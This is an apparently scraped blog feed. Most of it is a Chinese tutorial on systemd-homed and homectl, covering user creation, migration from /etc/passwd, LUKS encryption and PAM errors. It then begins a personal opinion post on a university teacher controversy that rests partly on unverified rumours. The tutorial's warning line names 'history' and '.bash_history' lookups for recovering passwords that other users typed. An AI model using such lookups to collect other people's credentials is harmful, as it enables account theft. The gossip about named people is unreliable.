Created symlink &#x2F;etc&#x2F;systemd&#x2F;system&#x2F;sockets.target.wants&#x2F;systemd-userdbd.socket → &#x2F;usr&#x2F;lib&#x2F;systemd&#x2F;system&#x2F;systemd-userdbd.socket.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p>新建用户</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">homectl create zhixi<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>会像下面这样提示你输入密码，输完之后要稍等一会</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">[</span>root@zjk-allseries zjk<span class="token punctuation">]</span><span class="token comment"># homectl create zhixi</span>
🔐 Please enter new password <span class="token keyword">for</span> user zhixi: ******                  
🔐 Please enter new password <span class="token keyword">for</span> user zhixi <span class="token punctuation">(</span>repeat<span class="token punctuation">)</span>: <span class="token punctuation">(</span>press TAB <span class="token keyword">for</span> no <span class="token builtin class-name">echo</span><span class="token punctuation">)</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p>创建成功之后使用<code>homectl list</code>查看homectl创建的用户是否存在</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">[</span>root@zjk-allseries zjk<span class="token punctuation">]</span><span class="token comment"># homectl list</span>
NAME  <span class="token environment constant">UID</span>   GID   STATE    REALNAME <span class="token environment constant">HOME</span>        <span class="token environment constant">SHELL</span>    
<span class="token builtin class-name">test</span>  <span class="token number">60444</span> <span class="token number">60444</span> inactive <span class="token builtin class-name">test</span>     /home/test  /bin/bash
test1 <span class="token number">60510</span> <span class="token number">60510</span> inactive test1    /home/test1 /bin/bash
zhixi <span class="token number">60353</span> <span class="token number">60353</span> inactive zhixi    /home/zhixi /bin/bash

<span class="token number">3</span> home areas listed.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><code>homectl inspect username</code>可以查看用户信息</p>
<pre class="line-numbers language-none"><code class="language-none">[root@zjk-allseries zhixi]# homectl inspect zhixi
   User name: zhixi
       State: active
 Disposition: regular
 Last Change: Sat 2020-10-31 17:05:25 CST
    Login OK: yes
 Password OK: yes
         UID: 60353
         GID: 60353 (zhixi)
   Directory: &#x2F;home&#x2F;zhixi
     Storage: luks (strong encryption)
  Image Path: &#x2F;home&#x2F;zhixi.home
   Removable: no
       Shell: &#x2F;bin&#x2F;bash
LUKS Discard: online&#x3D;no offline&#x3D;yes
   LUKS UUID: 107ff22e399d417d92f398c91275de3b
   Part UUID: 645499ec3e554eaca0f09a9b172d89b3
     FS UUID: a6b5969ecfee4ae49f0cad9931f31589
 File System: ext4
 LUKS Cipher: aes
 Cipher Mode: xts-plain64
  Volume Key: 256bit
 Mount Flags: nosuid nodev exec
   Disk Size: 654.0G
  Disk Usage: 11.3G (&#x3D; 1.8%)
   Disk Free: 642.7G (&#x3D; 98.2%)
  Disk Floor: 11.3G
Disk Ceiling: 769.5G
  Good Auth.: 1
   Last Good: Sat 2020-10-31 19:23:25 CST
   Bad Auth.: 1
    Last Bad: Sat 2020-10-31 19:23:17 CST
    Next Try: anytime
 Auth. Limit: 30 attempts per 1min
   Passwords: 1
  Local Sig.: yes
     Service: io.systemd.Home
lines 2-36&#x2F;36 (END)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>然后激活用户</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">homectl activate zhixi<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>退出当前用户并切换用户就可以了(你可能需要更改PAM设置才能正常使用su切换用户)</p>
<h3 id="从原来的用户组管理方式迁往systemd-homed">从原来的用户组管理方式迁往systemd-homed</h3>
<blockquote>
<p>这里直接复读一下systemd官网的警告，需要手动操作、有风险、做好备份、出了事自行承担</p>
</blockquote>
<p>(不喜欢折腾的人不推荐这么干，原来的又不是不能用了</p>
<p>其实建议你直接去看<span class="exturl" data-url="aHR0cHM6Ly9zeXN0ZW1kLmlvL0NPTlZFUlRJTkdfVE9fSE9NRUQv">官网的英文说明<i class="fa fa-external-link-alt"></i></span>，这个是给不想看官方文档的懒狗准备的（不会吧不会吧，不会真有这种懒狗吧）</p>
<p>切到root操作，先重命名你的用户目录，随便移到一个空间够的位置</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">mv</span> /home/zhixi /home/zhixi.saved<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>然后看一下你的用户设置（假设用户名是zhixi,GID=1000），以及所在的用户组设置（1000改成你的GID）</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">getent <span class="token function">passwd</span> zhixi
getent shadow zhixi
getent group <span class="token number">1000</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p>（上面是官方文档的做法，也可以用<code>lslogin -u</code>查看）</p>
<p>把上面这些也备份一下。然后把<code>/etc/passwd</code>和<code>/etc/shadow</code>和<code>/etc/group</code>还有<code>/etc/gshadow</code>里面的zhixi用户相关的东西删了（基本上就只有一行）。</p>
<p>（官方文档说为了安全请使用<code>vipw</code>, <code>vipw -s</code>, <code>vigr</code> and <code>vigr -s</code>，这些是给配置文件加锁，防止多人同时更改出现问题，使用跟vim一样（找到那一行按dd然后ESC, :,wq回车就好了），如果你确定是自己一个人操作（也没有别人远程登陆或者其他程序正在修改），似乎用别的什么文本编辑器也没什么问题）</p>
<p>（其实，你可以直接用<code>userdel</code>删除）</p>
<p>然后剩下的操作跟第一节一样，用<code>homectl</code>新建一个就好了</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">homectl create zhixi --uid<span class="token operator">=</span><span class="token number">1000</span> --real-name<span class="token operator">=</span>zjk<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>(uid填你的uid，real-name后面填你的GECOS)</p>
<p>可能你还想改改磁盘加密方式什么的，想设置的都先设置好。</p>
<p>然后rsync把原来备份了的东西放回<code>/home/zhixi</code></p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">homectl with zhixi -- <span class="token function">rsync</span> -aHAXv --remove-source-files /home/zhixi.saved/ <span class="token builtin class-name">.</span> <span class="token operator">&amp;&amp;</span>  <span class="token function">rmdir</span> /home/foobar.saved<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h3 id="注意">注意</h3>
<p>systemd-homed是一个用户一个私有用户组。如果你一个用户组设置了多个用户的话，可能要调整一下。</p>
<h2 id="systemd-homed简介">systemd-homed简介</h2>
<p><del>感觉这下子systemd接管的东西更多了</del></p>
<h3 id="以前的用户和用户组管理">以前的用户和用户组管理</h3>
<p>好吧，以前要加引号，现在这个在大部分Linux都还没人用呢（甚至连一篇中文介绍都没有）。</p>
<p>通常使用<code>useradd</code>或<code>adduser</code>新建用户（不同发行版这两条命令有一点区别），比如</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">useradd</span> -U temp
<span class="token function">sudo</span> <span class="token function">useradd</span> temp1 -m -G temp<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>新建一个temp用户组并给temp用户组中新建一个叫temp1的用户（同时在<code>/home</code>下新建一个<code>temp1</code>目录作为用户目录）。</p>
<p>然后使用<code>passwd temp1</code>为用户temp1指定密码</p>
<p>（虽然useradd有<code>-p</code>选项可以直接指定密码，通常不建议这样做，因为这样子恁的密码会明文留在历史命令里，如果有人不怀好意的执行一下<code>history</code>或者<code>more /home/$USER/.bash_history</code>或者<code>ctrl+r</code>搜索useradd，他将轻易获取你的密码），你用了sudo也可能会被找到，比如<span class="exturl" data-url="aHR0cHM6Ly9zdXBlcnVzZXIuY29tL3F1ZXN0aW9ucy8zMDk0MzQvaG93LXRvLXZpZXctY29tbWFuZC1oaXN0b3J5LW9mLWFub3RoZXItdXNlci1pbi1saW51eA==">这个<i class="fa fa-external-link-alt"></i></span></p>
<p><span class="exturl" data-url="aHR0cHM6Ly93d3cuZnJlZWJ1Zi5jb20vbmV3cy8xMzU4NDUuaHRtbA==">https://www.freebuf.com/news/135845.html<i class="fa fa-external-link-alt"></i></span> history -c 也不太保险</p>
<p>你的用户名、密码、用户组、权限配置基本都放在<code>/etc</code>目录下面，比如<code>/etc/passwd</code>里面存你的密码，<code>etc/group</code>里面放用户组的设置。<code>/etc/sudoers</code>是超级用户的设置。每个用户的配置散落在各个地方，一些个人设置还被放在了<code>/home/user</code>底下。</p>
<p>这个样子你需要<code>/etc</code>的写权限，一个用户不同系统迁移的时候需要同时迁移其他的目录（而且UID还得一样），想对<code>/home</code>单独加密也不太方便。</p>
<h3 id="变化">变化</h3>
<p>主要的变化就是你的个人用户都扔到<code>/home/yourusername</code>下面了。（据说）这样更方便加密和迁移。默认采用LUKS，在用户登陆的时候解密并挂载<code>/home/user</code>，在用户退出登陆的时候加密并取消挂载。休眠挂起（Suspend）的时候也会加密锁住。</p>
<p>比如你有一个u盘，里面装了你的用户目录，到别的电脑上插上去就能用了，不需要那边给你新建一个用户（现在基本不太行，对面电脑起码得也是systemd 245 版本以上还得启用<code>systemd-homed</code>，我乐观估计等这玩意普及至少得两年吧，那些用老CentOS的万年钉子户更别想了）</p>
<p>这样也方便全盘加密（我不是那种对物理安全都看的很在乎的申必人士，据说全盘加密会有点性能问题，而且休眠睡眠也比较容易起不来，所以我没试过）（不过恁不用这个systemd-homed其实也能全盘加密）</p>
<p>现在使用<code>systemd-homed.service</code>和<code>systemd-userdbd.service</code>两个daemon管理用户，登陆的时候是<code>systemd-logind</code> 在管。大概是这么个流程：</p>
<p><img src="/systemd-homed/image-20201108172857040.png" /></p>
<p><img src="/systemd-homed/image-20201108172321494.png" /></p>
<p>另外，Yubikeys现在是一等公民（说的好像这小玩意这么贵我买得起一样） Yubikeys或者别的加密设备我手头没有，而且LUKS加密home目录之类的我也没有那么高的安全需求，哪位好心人要是愿意送/借我一个玩玩，我把这部分内容补上</p>
<h3 id="现在的样子">现在的样子</h3>
<p>使用<code>homectl activate</code>激活用户目录后你会看到在<code>/home</code>目录下多了一个用户目录</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ homectl activate zhixi
🔐 Please enter password <span class="token keyword">for</span> user zhixi: ****** <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>原来<code>/home</code>下只有一个zhixi.home，activate之后多了一个zhixi目录</p>
<p>我们看一下这个目录下面有什么</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ <span class="token builtin class-name">cd</span> /home/zhixi <span class="token operator">&amp;&amp;</span> <span class="token function">ls</span> -a
<span class="token builtin class-name">.</span>  <span class="token punctuation">..</span>  .bash_logout  .bash_profile  .bashrc  .identity<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>其中的<code>.identity</code>存放你的密码等登陆认证信息（以json存储用户记录（JSON User Recoed））,大概长这样</p>
<figure>
<img src="/systemd-homed/image-20201108170804174.png" alt="image-20201108170804174" /><figcaption aria-hidden="true">image-20201108170804174</figcaption>
</figure>
<p><code>homectl inspect username</code>可以查看用户信息</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ homectl inspect zhixi
   User name: zhixi
       State: active
 Disposition: regular
 Last Change: Sat <span class="token number">2020</span>-10-31 <span class="token number">17</span>:05:25 CST
    Login OK: <span class="token function">yes</span>
 Password OK: <span class="token function">yes</span>
         <span class="token environment constant">UID</span><span class="token builtin class-name">:</span> <span class="token number">60353</span>
         GID: <span class="token number">60353</span> <span class="token punctuation">(</span>zhixi<span class="token punctuation">)</span>
   Directory: /home/zhixi
     Storage: luks <span class="token punctuation">(</span>strong encryption<span class="token punctuation">)</span>
  Image Path: /home/zhixi.home
   Removable: no
       Shell: /bin/bash
LUKS Discard: <span class="token assign-left variable">online</span><span class="token operator">=</span>no <span class="token assign-left variable">offline</span><span class="token operator">=</span>yes
   LUKS UUID: 107ff22e399d417d92f398c91275de3b
   Part UUID: 645499ec3e554eaca0f09a9b172d89b3
     FS UUID: a6b5969ecfee4ae49f0cad9931f31589
 File System: ext4
 LUKS Cipher: aes
 Cipher Mode: xts-plain64
  Volume Key: 256bit
 Mount Flags: nosuid nodev <span class="token builtin class-name">exec</span>
   Disk Size: <span class="token number">654</span>.0G
  Disk Usage: <span class="token number">11</span>.3G <span class="token punctuation">(</span><span class="token operator">=</span> <span class="token number">1.8</span>%<span class="token punctuation">)</span>
   Disk Free: <span class="token number">642</span>.7G <span class="token punctuation">(</span><span class="token operator">=</span> <span class="token number">98.2</span>%<span class="token punctuation">)</span>
  Disk Floor: <span class="token number">11</span>.3G
Disk Ceiling: <span class="token number">769</span>.5G
  Good Auth.: <span class="token number">1</span>
   Last Good: Sat <span class="token number">2020</span>-10-31 <span class="token number">19</span>:23:25 CST
   Bad Auth.: <span class="token number">1</span>
    Last Bad: Sat <span class="token number">2020</span>-10-31 <span class="token number">19</span>:23:17 CST
    Next Try: anytime
 Auth. Limit: <span class="token number">30</span> attempts per 1min
   Passwords: <span class="token number">1</span>
  Local Sig.: <span class="token function">yes</span>
     Service: io.systemd.Home
lines <span class="token number">2</span>-36/36 <span class="token punctuation">(</span>END<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h3 id="存在的一些问题">存在的一些问题</h3>
<p>这个东西主要是focus on <code>particularly Laptop users</code>，目前可能多多少少有点小问题。企业用途和运维貌似也不怎么需要这个。</p>
<h4 id="ssh的问题">SSH的问题</h4>
<p>这个东西直接把/home全都加密了，当然也包括<code>.ssh</code>目录下面的东西。</p>
<p>目前看来没有什么很完美的办法，有人是这样干的：先整一个其他的空用户在他的/home/user下面存公钥，用密码登陆，然后su切过去。(反正看起来挺扭曲的)</p>
<p>不过对于笔记本个人用户来说SSH到自己的加密盘貌似不是什么刚需，还是等完善了随身带着硬盘走比较好。</p>
<h4 id="休眠">休眠</h4>
<p>貌似不少人会碰到奇奇怪怪的休眠问题，很在意休眠的笔记本用户请谨慎上车。</p>
<h4 id="删除用户后sddm仍有残留">删除用户后SDDM仍有残留</h4>
<p>用<code>homectl activate</code>激活了一个用户temp1，然后用<code>homectl remove</code>删除了这个用户temp1，结果发现我的SDDM在登陆页面仍然有原来的temp1。检查<code>/home</code>发现这下面已经没有temp1.home文件了，但是还有temp1这个文件夹（受保护）。</p>
<p>我又用刚才新建的用户zhixi试了一下，在inactive情况下会比较干净的remove。</p>
<h2 id="可能的报错">可能的报错</h2>
<pre class="line-numbers language-none"><code class="language-none">homectl su: Authentication service cannot retrieve authentication info<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>可能是你的daemon没启动，试试启动daemon并重启一下试试。</p>
<pre class="line-numbers language-none"><code class="language-none">Operation on home me failed: Specified user name me conflicts with an NSS group by the same name, refusing.<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>用户组冲突了，看看你之前是不是用useradd之类的操作新建过同名用户组。</p>
<pre class="line-numbers language-none"><code class="language-none">su: Authentication service cannot retrieve authentication info<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>这个报错出现在我换到systemd-homed后试图用su切换用户。一开始我用 su 在桌面环境下切用户就没成功过，退出登陆后跑到SDDM里是可以的，本来以为这是个feature。后来觉得不应该啊，一查果然，要手动改PAM设置，在<code>/etc/pam.d</code>里面改一下su的配置就好了。配置照着模板改就好了，<code>man pam_systemd_home</code>，详情参考<span class="exturl" data-url="aHR0cHM6Ly93d3cuZnJlZWRlc2t0b3Aub3JnL3NvZnR3YXJlL3N5c3RlbWQvbWFuL3BhbV9zeXN0ZW1kX2hvbWUuaHRtbA==">pam_systemd_home<i class="fa fa-external-link-alt"></i></span>，arch用户看<span class="exturl" data-url="aHR0cHM6Ly9qbGsuZmpmaS5jdnV0LmN6L2FyY2gvbWFucGFnZXMvbWFuL3BhbV9zeXN0ZW1kX2hvbWUuOA==">这里<i class="fa fa-external-link-alt"></i></span></p>
<figure>
<img src="/systemd-homed/image-20201108142022596.png" alt="PAM模板例子" /><figcaption aria-hidden="true">PAM模板例子</figcaption>
</figure>
<p>而且看起来很多时候有root权限它还是会让你输入当前用户的密码，比如<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3N5c3RlbWQvc3lzdGVtZC9pc3N1ZXMvMTYxNjY=">这个issue<i class="fa fa-external-link-alt"></i></span></p>
<pre class="line-numbers language-none"><code class="language-none">Operation on home username failed: Access denied<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>权限不够，你至少需要root权限或者要切换到的那个用户的密码才能操作对应目录或者修改配置。（貌似homectl的很多操作需要输入）</p>
<pre class="line-numbers language-none"><code class="language-none">Operation on home username failed: Failed to execute operation: File exists<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>这个错误的原因可能有很多，或许可以试试<code>systemctl restart systemd-homed</code></p>
<pre class="line-numbers language-none"><code class="language-none">(Unknown (FileSystemError): Error: ENOSPC: no space left on device, write)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>我新建第二个的时候没有指定存储空间，直接塞满了。用<code>homectl resize user 10G</code>调整了磁盘分配后解决。</p>
<h2 id="附">附</h2>
<p>给不愿意<code>--help</code>看英文说明的懒狗翻译一下命令选项</p>
<h3 id="homectl命令选项">homectl命令选项</h3>
<table>
<colgroup>
<col style="width: 12%" />
<col style="width: 28%" />
<col style="width: 36%" />
<col style="width: 20%" />
<col style="width: 2%" />
</colgroup>
<thead>
<tr class="header">
<th>homectl</th>
<th>Explinations</th>
<th>作用</th>
<th>例子</th>
<th></th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td>list</td>
<td>List home areas</td>
<td>列出用户信息（包括NAME UID GID STATE REALNAME HOME SHELL）</td>
<td>homectl list</td>
<td></td>
</tr>
<tr class="even">
<td>activate USER…</td>
<td>Activate a home area</td>
<td>激活用户（执行后<code>/home</code>下面会多出一个和用户同名的目录）</td>
<td>homectl activate zhixi</td>
<td></td>
</tr>
<tr class="odd">
<td>deactivate USER…</td>
<td>Deactivate a home area</td>
<td>取消激活</td>
<td>homectl deactivate zhixi</td>
<td></td>
</tr>
<tr class="even">
<td>inspect USER…</td>
<td>Inspect a home area</td>
<td>查看用户信息，跟userdbctl user... 的输出差不多</td>
<td>homectl inspect zhixi</td>
<td></td>
</tr>
<tr class="odd">
<td>authenticate USER…</td>
<td>Authenticate a home area</td>
<td>验证用户</td>
<td>homectl authenticate zhixi</td>
<td></td>
</tr>
<tr class="even">
<td>create USER</td>
<td>Create a home area</td>
<td>新建用户</td>
<td>homectl create zhixi</td>
<td></td>
</tr>
<tr class="odd">
<td>remove USER…</td>
<td>Remove a home area</td>
<td>移除用户</td>
<td>homectl remove zhixi</td>
<td></td>
</tr>
<tr class="even">
<td>update USER</td>
<td>Update a home area</td>
<td>更改用户设置和状态</td>
<td>homectl update me --locked=false</td>
<td></td>
</tr>
<tr class="odd">
<td>passwd USER</td>
<td>Change password of a home area</td>
<td>改密码</td>
<td>homectl passwd zhixi</td>
<td></td>
</tr>
<tr class="even">
<td>with USER [COMMAND…]</td>
<td>Run shell or command with access to a home area</td>
<td>用到/在某个用户目录下执行命令（需要root或该用户密码）</td>
<td>homectl with zhixi -- mkdir test1</td>
<td></td>
</tr>
<tr class="odd">
<td>resize USER SIZE</td>
<td>Resize a home area</td>
<td>调整用户的存储空间</td>
<td>homectl resize zhixi 30G</td>
<td></td>
</tr>
<tr class="even">
<td>lock USER...</td>
<td>Temporarily lock an active home area</td>
<td>锁定用户</td>
<td>homectl lock zhixi</td>
<td></td>
</tr>
<tr class="odd">
<td>unlock USER</td>
<td>Unlock a temporarily locked home area</td>
<td>解锁用户</td>
<td>homectl unlock zhixi</td>
<td></td>
</tr>
</tbody>
</table>
<h3 id="userdbctl命令选项">userdbctl命令选项</h3>
<table>
<colgroup>
<col style="width: 19%" />
<col style="width: 41%" />
<col style="width: 13%" />
<col style="width: 25%" />
</colgroup>
<thead>
<tr class="header">
<th>userdbctl</th>
<th>Explinations</th>
<th>作用</th>
<th>例子</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td>user [USER…]</td>
<td>Inspect user</td>
<td>查看用户信息</td>
<td>userdbctl user zhixi</td>
</tr>
<tr class="even">
<td>group [GROUP…]</td>
<td>Inspect group</td>
<td>查看用户组信息</td>
<td>userdbctl group zhixi</td>
</tr>
<tr class="odd">
<td>users-in-group [GROUP…]</td>
<td>Show users that are members of specified group(s)</td>
<td>查看组中用户</td>
<td>userdbctl users-in-group zhixi</td>
</tr>
<tr class="even">
<td>groups-of-user [USER…]</td>
<td>Show groups the specified user(s) is a member of</td>
<td>查看用户所在的组</td>
<td>userdbctl groups-of-user zhixi</td>
</tr>
</tbody>
</table>
<h2 id="参考">参考</h2>
<p><span class="exturl" data-url="aHR0cHM6Ly9zeXN0ZW1kLmlvL0hPTUVfRElSRUNUT1JZLw==">https://systemd.io/HOME_DIRECTORY/<i class="fa fa-external-link-alt"></i></span> 官方文档</p>
<p><span class="exturl" data-url="aHR0cHM6Ly93d3cubWFuNy5vcmcvbGludXgvbWFuLXBhZ2VzL21hbjEvaG9tZWN0bC4xLmh0bWw=">https://www.man7.org/linux/man-pages/man1/homectl.1.html<i class="fa fa-external-link-alt"></i></span> <span class="exturl" data-url="aHR0cHM6Ly93d3cuZnJlZWRlc2t0b3Aub3JnL3NvZnR3YXJlL3N5c3RlbWQvbWFuL2hvbWVjdGwuaHRtbA==">https://www.freedesktop.org/software/systemd/man/homectl.html<i class="fa fa-external-link-alt"></i></span></p>
<p><span class="exturl" data-url="aHR0cHM6Ly9sd24ubmV0L0FydGljbGVzLzgxNDA2OC8=">systemd 245 released<i class="fa fa-external-link-alt"></i></span> systemd第245次更新详情</p>
<p><span class="exturl" data-url="aHR0cHM6Ly93aWtpLmFyY2hsaW51eC5vcmcvaW5kZXgucGhwL1N5c3RlbWQtaG9tZWQ=">https://wiki.archlinux.org/index.php/Systemd-homed<i class="fa fa-external-link-alt"></i></span></p>
<p><span class="exturl" data-url="aHR0cHM6Ly93aWtpLmFyY2hsaW51eC5vcmcvaW5kZXgucGhwL1VzZXJzX2FuZF9ncm91cHNfKOeugOS9k+S4reaWhyk=">https://wiki.archlinux.org/index.php/Users_and_groups_(简体中文)<i class="fa fa-external-link-alt"></i></span></p>
<p><span class="exturl" data-url="aHR0cHM6Ly9zeXN0ZW1kLmlvL0NPTlZFUlRJTkdfVE9fSE9NRUQv">https://systemd.io/CONVERTING_TO_HOMED/<i class="fa fa-external-link-alt"></i></span></p>
<p><span class="exturl" data-url="aHR0cHM6Ly93d3cucmVkZGl0LmNvbS9yL2FyY2hsaW51eC9jb21tZW50cy9mZ2M5MWIvd2l0aF9zeXN0ZW1kXzI0NV9sYW5kaW5nX2luX3JlcG9zX3N5c3RlbWRob21lZF9pcy8=">https://www.reddit.com/r/archlinux/comments/fgc91b/with_systemd_245_landing_in_repos_systemdhomed_is/<i class="fa fa-external-link-alt"></i></span> 在Arch上使用的reddit讨论，archwiki的页面也是这个帖子的楼主写的</p>
<p><span class="exturl" data-url="aHR0cHM6Ly9tZWRpYS5jY2MuZGUvdi9BU0cyMDE5LTE2NC1yZWludmVudGluZy1ob21lLWRpcmVjdG9yaWVz">https://media.ccc.de/v/ASG2019-164-reinventing-home-directories<i class="fa fa-external-link-alt"></i></span> 一个传教视频</p>
<p><span class="exturl" data-url="aHR0cHM6Ly9jZnAuYWxsLXN5c3RlbXMtZ28uaW8vbWVkaWEvaG9tZWQtYXNnMjAxOS5wZGY=">https://cfp.all-systems-go.io/media/homed-asg2019.pdf<i class="fa fa-external-link-alt"></i></span> 一个传教PPT</p>
<p>其他的一些简介</p>
<p><span class="exturl" data-url="aHR0cHM6Ly9saW51eHJldmlld3Mub3JnL1N5c3RlbWQtSG9tZWRfSXNfTWVyZ2VkX0FuZF9JdF9XaWxsX0Z1bmRhbWVudGFsbHlfQ2hhbmdlX0xpbnV4X0hvbWVfRGlyZWN0b3JpZXM=">https://linuxreviews.org/Systemd-Homed_Is_Merged_And_It_Will_Fundamentally_Change_Linux_Home_Directories<i class="fa fa-external-link-alt"></i></span></p>
<p><span class="exturl" data-url="aHR0cHM6Ly93d3cudGVjaHJlcHVibGljLmNvbS9hcnRpY2xlL2xpbnV4LWhvbWUtZGlyZWN0b3J5LW1hbmFnZW1lbnQtaXMtYWJvdXQtdG8tdW5kZXJnby1tYWpvci1jaGFuZ2Uv">https://www.techrepublic.com/article/linux-home-directory-management-is-about-to-undergo-major-change/<i class="fa fa-external-link-alt"></i></span></p>
]]></content>
      <categories>
        <category>不务正业系列</category>
      </categories>
      <tags>
        <tag>homectl</tag>
        <tag>systemd-homed</tag>
      </tags>
  </entry>
  <entry>
    <title>郑文锋老师的四大发明事件始末</title>
    <url>/16e8/</url>
    <content><![CDATA[<p>今天在<span class="exturl" data-url="aHR0cHM6Ly91ZXN0Yy5pY3U=">uestc.icu<i class="fa fa-external-link-alt"></i></span>和微博上看见好几次，貌似出了个红头文件处理结果，无法确定真假。当时最早那个知乎问题上了知乎热搜第一的时候我也目睹了。在这里随便扯一下吧，夹杂大量个人主观判断。 <a id="more"></a></p>
<p><img width=200 src="https://raw.githubusercontent.com/Archaeoraptor/image_resources/ImageofBlog/xzx.jpg" alt="镇楼"/></p>
<p>起因是一名研究生<span class="exturl" data-url="aHR0cHM6Ly93d3cuemhpaHUuY29tL3F1ZXN0aW9uLzMyOTQ5NTM2NC9sb2c=">在知乎发帖<i class="fa fa-external-link-alt"></i></span>，想搞个大新闻，此前貌似就在河畔发帖试图搞个大新闻未遂，被獾狸猿删除后转战知乎。然而事与愿违，确实火了，但是是被喷上热搜的，而且登顶热搜第一。这里不得不再一次说你电公关确实了得，大半夜的热搜瞬间被撤，掉下来后又上了热搜，又瞬间从第二名掉到十几名;而且问题下面的回答还在以肉眼可见的速度不断减少，从接近两千变成一千五百多，又变成一千三百多，即便算上被折叠的评论，也是有问题的。而且该问题还被隐藏了，直接知乎站内搜索你是搜不到的（现在直接搜依然搜不到） <img src="https://raw.githubusercontent.com/Archaeoraptor/image_resources/ImageofBlog/pic1.PNG" alt="最初的问题" /></p>
<h3 id="想搞个大新闻的学生">想搞个大新闻的学生</h3>
<p>对于该研究生，我个人是鄙夷的。当时几乎目睹了全过程。将老师挂起来公然批斗。然而匿名提问，还把自己在QQ截图中的头像名称全都打码，知乎提问却直接指名道姓，上来就“公然侮辱”，滑天下之大稽。 此外还有该生之前完全旷课理亏在先等，此处不表。</p>
<p>电卫兵，电卫兵.jpg <img width=300 src="https://raw.githubusercontent.com/Archaeoraptor/image_resources/ImageofBlog/student1.jpg" alt="电卫兵言论大赏"/> 擦屁股言论可真是太搞笑了 <span class="exturl" data-url="aHR0cHM6Ly93d3cuemhpaHUuY29tL3F1ZXN0aW9uLzI5OTM4OTQ4MC9hbnN3ZXIvNTE2NDQyMzg3">https://www.zhihu.com/question/299389480/answer/516442387<i class="fa fa-external-link-alt"></i></span> <img src="https://raw.githubusercontent.com/Archaeoraptor/image_resources/ImageofBlog/beifeng.PNG" alt="北风三号机" /></p>
<p>而一些难以证实的传言和截图表明此事行为更加恶劣 <img width=300 src="https://raw.githubusercontent.com/Archaeoraptor/image_resources/ImageofBlog/%E5%8A%88%E6%88%90.jpg" alt="小道消息"/></p>
<h3 id="郑文锋老师">郑文锋老师</h3>
<p>我也不认识郑老师，也没上过他的课，跟他不熟 （或许我读研时有机会去看看他的课，如果他不是真被处分停课的话）</p>
<p>之前核心通识课程上过自动化学院谢永乐老师的课，闭着眼谢永乐老师，当时那个课只有一个学分，但是谢老师很“事多”。每节课必点名，而且几乎每个人都要认一遍（其实每个人都要认一遍，谢老师基本每个人都很关心，这个课是小班，不到二十个人，想逃课或者水过去是不可能的），还要经常把每个请上台讲一下自己的观点。而且中途还要交作业，几千字（具体多少字忘了，反正不少于五千）的小论文，期中期末各一次，必须手写。谢老师讲课时非常有热情，批改也及其认真。这就造成了这门课强度几乎高于很多两三个学分的必修课。 这似乎也导致了这门课的评价两极分化，一些人唯恐避之不及，一些人觉得这是个很好的老师。 谢老师是很欢迎我们讨论的，自己说“不搞一言堂，我们也不是文革，只有一个声音”，把我们拉上去讨论也很希望出现新的见解。谢老师上课很认真，备课也很负责，看得出来谢老师是真的喜欢传统文化，真的很喜欢古诗词。（不过虽然他确实读了不少古文古诗，但是章口就莱时还是念错不少字，被刚高考完半年的我敏锐地挑了出来） 说来惭愧，谢老师表扬过我，本人至今还和谢老师是微信好友。现在我基本修完大学所有的学分了，谢老师文学水平且不提，感觉这么较真的课程已经超过绝大部分必修了。</p>
